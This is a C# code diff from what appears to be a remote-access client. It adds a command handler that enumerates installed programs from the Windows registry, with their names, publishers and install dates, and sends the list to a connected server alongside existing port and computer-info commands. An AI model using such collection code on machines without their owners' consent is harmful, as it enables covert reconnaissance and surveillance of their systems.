@@ -345,6 +345,10 @@ namespace Client
                     case "GetActivePorts":
                         GetActivePorts();
                         break;
+                    
+                    case "GetAppsInstalled":
+                        GetAppsInstalled();
+                        break;
 
                     case "GetComputerInfo":
                         GetComputerInfo();
@@ -601,6 +605,42 @@ namespace Client
             string[] StringArray = ProcessList.ToArray<string>();
             List<byte> ToSend = new List<byte>();
             ToSend.Add((int)DataType.ActivePorts);
+            string ListString = "";
+            foreach (string Process in StringArray) ListString += "][" + Process;
+            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
+            Networking.MainClient.Send(ToSend.ToArray());
+        }
+        
+        
+        private void GetAppsInstalled()
+        {
+            List<string> AppsList = new List<string>();
+
+            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
+            {
+                foreach (string subkey_name in key.GetSubKeyNames())
+                {
+                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
+                    {
+                        if (subkey.GetValue("DisplayName") != null)
+                        {
+                            string a = "";
+                            if (subkey.GetValue("InstallDate") != null)
+                            {
+                                a = subkey.GetValue("InstallDate").ToString();
+                                a = a.Substring(6, 2) + "." + a.Substring(4, 2) + "." + a.Substring(0, 4);
+                            }
+                            AppsList.Add("p1" + subkey.GetValue("DisplayName") + "}p2" + subkey.GetValue("Publisher") + "{p3" + a + ";");
+                        }
+                    }
+
+                }
+            }
+
+            string[] StringArray = AppsList.ToArray<string>();
+            List<byte> ToSend = new List<byte>();
+            ToSend.Add((int)DataType.AppsInstalled);
             string ListString = "";
             foreach (string Process in StringArray) ListString += "][" + Process;
             ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
